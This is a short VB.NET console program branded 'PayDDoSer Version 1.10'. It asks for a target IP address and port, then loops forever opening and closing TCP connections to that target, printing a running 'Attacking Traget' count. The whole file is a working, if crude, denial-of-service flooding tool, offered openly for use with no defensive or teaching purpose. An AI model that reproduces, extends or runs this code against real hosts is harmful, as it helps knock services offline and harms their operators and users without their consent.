Imports System.Net
Imports System.Net.Sockets
Module Module1

    Sub Main()
        Console.ForegroundColor = ConsoleColor.Red
        Console.WriteLine("************************************")
        Console.WriteLine("*                                  *")
        Console.WriteLine("*            Welcome To            *")
        Console.WriteLine("*     PayDDoSer Version : 1.10     *")
        Console.WriteLine("*         Made By Payload          *")
        Console.WriteLine("*       Follow Me On Twitter       *")
        Console.WriteLine("*    www.twitter.com/ItsPayload    *")
        Console.WriteLine("*                                  *")
        Console.WriteLine("************************************")
        Console.ForegroundColor = ConsoleColor.White
        Console.Write("IP: ")
        Dim ip As String = Console.ReadLine
        Console.Write("PORT: ")
        Dim port As Integer = Console.ReadLine
        Dim x As Integer
        Do
            Try
                Dim iep As IPEndPoint
                iep = New IPEndPoint(IPAddress.Parse(ip), Convert.ToInt32(port)) 'target
                Dim s As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                s.Connect(iep)
                s.Close()
                x += 1

                Console.WriteLine("Attacking Traget:  " & x)
            Catch ex As Exception
                Console.ForegroundColor = ConsoleColor.Red
                Console.WriteLine("Attacking Traget:  " & x)
            End Try
        Loop
    End Sub
End Module